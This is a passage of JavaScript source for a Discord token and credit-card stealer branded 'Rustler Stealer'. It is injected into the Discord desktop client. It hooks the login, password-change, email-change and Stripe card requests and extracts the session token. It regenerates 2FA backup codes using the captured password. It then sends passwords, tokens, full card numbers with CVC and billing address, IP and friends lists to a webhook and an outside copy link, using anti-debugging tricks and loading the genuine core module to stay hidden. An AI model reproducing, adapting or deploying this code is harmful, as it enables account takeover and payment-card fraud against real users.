                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((O) => {
                                    function v() {
                                      var P = JSON.parse(O)
                                      const p = P.filter((F) => {
                                        return F.type == 1
                                      })
                                      return p.length
                                    }
                                    function o() {
                                      var P = JSON.parse(O)
                                      const F = P.filter((Q) => {
                                        return Q.type == 1
                                      })
                                      var g = ''
                                      for (z of F) {
                                        var p = GetRBadges(z.user.public_flags)
                                        if (p != '') {
                                          g +=
                                            p +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n')
                                        }
                                      }
                                      return (
                                        g == '' &&
                                          (g = '*Nothing to see here*'),
                                        g
                                      )
                                    }
                                    function i() {
                                      const g = JSON.parse(Z)
                                      var P = ''
                                      return (
                                        g.forEach((p) => {
                                          if (p.type == '') {
                                            return '`No`'
                                          } else {
                                            if (
                                              p.type == 2 &&
                                              p.invalid != true
                                            ) {
                                              P +=
                                                ' <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                p.type == 1 &&
                                                p.invalid != true
                                              ) {
                                                P += ' :credit_card:'
                                              } else {
                                                return '`No`'
                                              }
                                            }
                                          }
                                        }),
                                        P == '' && (P = '`No`'),
                                        P
                                      )
                                    }
                                    const h = JSON.parse(u)
                                    var B = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                J +
                                                '`' +
                                                '\n[CopyToken](https://Rustlercoppy.com/copy/' +
                                                J +
                                                '<br>' +
                                                h.email +
                                                ':' +
                                                b +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(h.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(h.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + i(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + E + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + h.email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Old Password:',
                                              value: '`' + s + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> New Password:',
                                              value: '`' + b + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              h.username +
                                              '#' +
                                              h.discriminator +
                                              ' (' +
                                              h.id +
                                              ')',
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              h.id +
                                              '/' +
                                              h.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: o(),
                                          author: {
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(B))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangeEmail(s, b, J) {
  const W = BrowserWindow.getAllWindows()[0]
  W.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        J +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((K) => {
      W.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((d) => {
          W.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                J +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((l) => {
              W.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    J +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((G) => {
                  if (J.startsWith('mfa')) {
                    W.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          J +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          b +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((N) => {
                        var M = [],
                          n = 'https://Rustlercoppy.com/copy/'
                        var u = JSON.parse(N)
                        let k = u.backup_codes
                        const E = k.filter((v) => {
                          return v.consumed == null
                        })
                        for (let v in E) {
                          M.push({
                            name: 'Code',
                            value: '`' + E[v].code.insert(4, '-') + '`',
                            inline: true,
                          }),
                            (n += E[v].code.insert(4, '-') + '<br>')
                        }
                        function j() {
                          var h = JSON.parse(G)
                          const X = h.filter((P) => {
                            return P.type == 1
                          })
                          return X.length
                        }
                        function Z() {
                          var h = JSON.parse(G)
                          const p = h.filter((F) => {
                            return F.type == 1
                          })
                          var X = ''
                          for (z of p) {
                            var P = GetRBadges(z.user.public_flags)
                            if (P != '') {
                              X +=
                                P +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          if (X == '') {
                            X = '*Nothing to see here*'
                          }
                          return X
                        }
                        function c() {
                          const h = JSON.parse(l)
                          var X = ''
                          h.forEach((P) => {
                            if (P.type == '') {
                              return '`\u274C`'
                            } else {
                              if (P.type == 2 && P.invalid != true) {
                                X += '`\u2714ï¸` <:paypal:896441236062347374>'
                              } else {
                                if (P.type == 1 && P.invalid != true) {
                                  X += '`\u2714ï¸` :credit_card:'
                                } else {
                                  return '`\u274C`'
                                }
                              }
                            }
                          })
                          if (X == '') {
                            X = '`\u274C`'
                          }
                          return X
                        }
                        const I = JSON.parse(K)
                        var O = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              title: 'Email Changed',
                              description:
                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://Rustlercoppy.com/copy/' +
                                J +
                                '<br>' +
                                b +
                                ')',
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: 'Info',
                                  value:
                                    '```Hostname: \n' +
                                    computerName +
                                    '\nIP: \n' +
                                    d +
                                    '```',
                                  inline: false,
                                },
                                {
                                  name: 'Username',
                                  value:
                                    '`' +
                                    I.username +
                                    '#' +
                                    I.discriminator +
                                    '`',
                                  inline: true,
                                },
                                {
                                  name: 'ID',
                                  value: '`' + I.id + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Nitro',
                                  value: '' + GetNitro(I.premium_type),
                                  inline: false,
                                },
                                {
                                  name: 'Badges',
                                  value: '' + GetBadges(I.flags),
                                  inline: false,
                                },
                                {
                                  name: 'Billing',
                                  value: '' + c(),
                                  inline: false,
                                },
                                {
                                  name: 'New Email',
                                  value: '`' + email + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Password',
                                  value: '`' + b + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Token',
                                  value: '```' + J + '```',
                                  inline: false,
                                },
                              ],
                              author: { name: 'Rustler Stealer' },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  I.id +
                                  '/' +
                                  I.avatar,
                              },
                            },
                            {
                              title: 'Total Friends (' + j() + ')',
                              color: config['embed-color'],
                              description: Z(),
                              author: { name: 'Rustler Stealer' },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  I.id +
                                  '/' +
                                  I.avatar,
                              },
                            },
                          ],
                        }
                        const D = {
                          title: ':detective: __2FA Codes__',
                          description: '[Get all of them](' + n + ')',
                          color: config['embed-color'],
                          fields: M,
                          author: {},
                          footer: {},
                        }
                        D.author.name = 'Rustler Stealer'
                        D.footer.text = 'Rustler Stealer'
                        var B = D
                        J.startsWith('mfa') && O.embeds.push(B)
                        SendToWebhook(JSON.stringify(O))
                      })
                  } else {
                    const N = BrowserWindow.getAllWindows()[0]
                    N.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          J +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((a) => {
                        N.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((n) => {
                            N.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  J +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((k) => {
                                N.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      J +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((j) => {
                                    function c() {
                                      var o = JSON.parse(j)
                                      const i = o.filter((h) => {
                                        return h.type == 1
                                      })
                                      return i.length
                                    }
                                    function I() {
                                      var o = JSON.parse(j)
                                      const i = o.filter((P) => {
                                        return P.type == 1
                                      })
                                      var h = ''
                                      for (z of i) {
                                        var X = GetRBadges(z.user.public_flags)
                                        X != '' &&
                                          (h +=
                                            X +
                                            (' ' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '\n'))
                                      }
                                      return (
                                        h == '' && (h = 'No Rare Friends'), h
                                      )
                                    }
                                    function O() {
                                      const v = JSON.parse(k)
                                      var o = ''
                                      return (
                                        v.forEach((i) => {
                                          if (i.type == '') {
                                            return '`\u274C`'
                                          } else {
                                            if (
                                              i.type == 2 &&
                                              i.invalid != true
                                            ) {
                                              o +=
                                                '`\u2714ï¸` <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                i.type == 1 &&
                                                i.invalid != true
                                              ) {
                                                o += '`\u2714ï¸` :credit_card:'
                                              } else {
                                                return '`\u274C`'
                                              }
                                            }
                                          }
                                        }),
                                        o == '' && (o = '`\u274C`'),
                                        o
                                      )
                                    }
                                    const D = JSON.parse(a)
                                    var B = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          title: 'Email Changed',
                                          description:
                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://Rustlercoppy.com/copy/' +
                                            J +
                                            '<br>' +
                                            b +
                                            ')',
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: 'Info',
                                              value:
                                                '```Hostname: \n' +
                                                computerName +
                                                '\nIP: \n' +
                                                n +
                                                '```',
                                              inline: false,
                                            },
                                            {
                                              name: 'Username',
                                              value:
                                                '`' +
                                                D.username +
                                                '#' +
                                                D.discriminator +
                                                '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'ID',
                                              value: '`' + D.id + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Nitro',
                                              value:
                                                '' + GetNitro(D.premium_type),
                                              inline: false,
                                            },
                                            {
                                              name: 'Badges',
                                              value: '' + GetBadges(D.flags),
                                              inline: false,
                                            },
                                            {
                                              name: 'Billing',
                                              value: '' + O(),
                                              inline: false,
                                            },
                                            {
                                              name: 'New Email',
                                              value: '`' + email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Password',
                                              value: '`' + b + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Token',
                                              value: '```' + J + '```',
                                              inline: false,
                                            },
                                          ],
                                          author: { name: 'Rustler Stealer' },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              D.id +
                                              '/' +
                                              D.avatar,
                                          },
                                        },
                                        {
                                          title: 'Total Friends (' + c() + ')',
                                          color: config['embed-color'],
                                          description: I(),
                                          author: { name: 'Rustler Stealer' },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              D.id +
                                              '/' +
                                              D.avatar,
                                          },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(B))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function CreditCardAdded(s, b, J, f, W, K, A, d, C, l) {
  const G = BrowserWindow.getAllWindows()[0]
  G.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        l +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((V) => {
      G.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((N) => {
          var a = JSON.parse(V)
          var M = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'User Credit Card Added',
                description:
                  '**Username:**```' +
                  a.username +
                  '#' +
                  a.discriminator +
                  '```\n**ID:**```' +
                  a.id +
                  '```\n**Email:**```' +
                  a.email +
                  '```\n' +
                  '**Nitro Type:**```' +
                  GetNitro(a.premium_type) +
                  '```\n**Badges:**```' +
                  GetBadges(a.flags) +
                  '```' +
                  '\n**Credit Card Number: **```' +
                  s +
                  '```' +
                  '\n**Credit Card Expiration: **```' +
                  J +
                  '/' +
                  f +
                  '```' +
                  '\n**CVC: **```' +
                  b +
                  '```\n' +
                  '**Country: **```' +
                  C +
                  '```\n' +
                  '**State: **```' +
                  A +
                  '```\n' +
                  '**City: **```' +
                  K +
                  '```\n' +
                  '**ZIP:**```' +
                  d +
                  '```' +
                  '\n**Street: **```' +
                  W +
                  '```' +
                  '\n**Token:**```' +
                  l +
                  '```' +
                  '\n**IP: **```' +
                  N +
                  '```',
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
                thumbnail: {
                  url:
                    'https://cdn.discordapp.com/avatars/' +
                    a.id +
                    '/' +
                    a.avatar,
                },
              },
            ],
          }
          SendToWebhook(JSON.stringify(M))
        })
    })
}
const yk = {}
yk.urls = [
  'https://discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/users/@me',
  'https://*.discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/auth/login',
  'https://discord.com/api/v*/auth/login',
  'https://*.discord.com/api/v*/auth/login',
  'https://api.stripe.com/v*/tokens',
]
const ChangePasswordFilter = yk
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (s, b) => {
  if (s.url.endsWith('login')) {
    if (s.statusCode == 200) {
      const f = JSON.parse(Buffer.from(s.uploadData[0].bytes).toString()),
        W = f.login,
        K = f.password,
        A = BrowserWindow.getAllWindows()[0]
      A.webContents
        .executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        )
        .then((d) => {
          Login(W, K, d)
        })
    } else {
    }
  }
  if (s.url.endsWith('users/@me')) {
    if (s.statusCode == 200 && s.method == 'PATCH') {
      const d = JSON.parse(Buffer.from(s.uploadData[0].bytes).toString())
      if (d.password != null && d.password != undefined && d.password != '') {
        if (
          d.new_password != undefined &&
          d.new_password != null &&
          d.new_password != ''
        ) {
          const C = BrowserWindow.getAllWindows()[0]
          C.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((l) => {
              ChangePassword(d.password, d.new_password, l)
            })
        }
        if (d.email != null && d.email != undefined && d.email != '') {
          const l = BrowserWindow.getAllWindows()[0]
          l.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((H) => {
              ChangeEmail(d.email, d.password, H)
            })
        }
      }
    } else {
    }
  }
  if (s.url.endsWith('tokens')) {
    const H = BrowserWindow.getAllWindows()[0],
      G = querystring.parse(
        decodeURIComponent(Buffer.from(s.uploadData[0].bytes).toString())
      )
    H.webContents
      .executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        true
      )
      .then((V) => {
        CreditCardAdded(
          G['card[number]'],
          G['card[cvc]'],
          G['card[exp_month]'],
          G['card[exp_year]'],
          G['card[address_line1]'],
          G['card[address_city]'],
          G['card[address_state]'],
          G['card[address_zip]'],
          G['card[address_country]'],
          V
        )
      })
  }
})
function L(s) {
  function J(f) {
    if (typeof f === 'string') {
      return function (W) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + f / f).length !== 1 || f % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    J(++f)
  }
  try {
    if (s) {
      return J
    } else {
      J(0)
    }
  } catch (f) {}
}
module.exports = require('./core.asar')
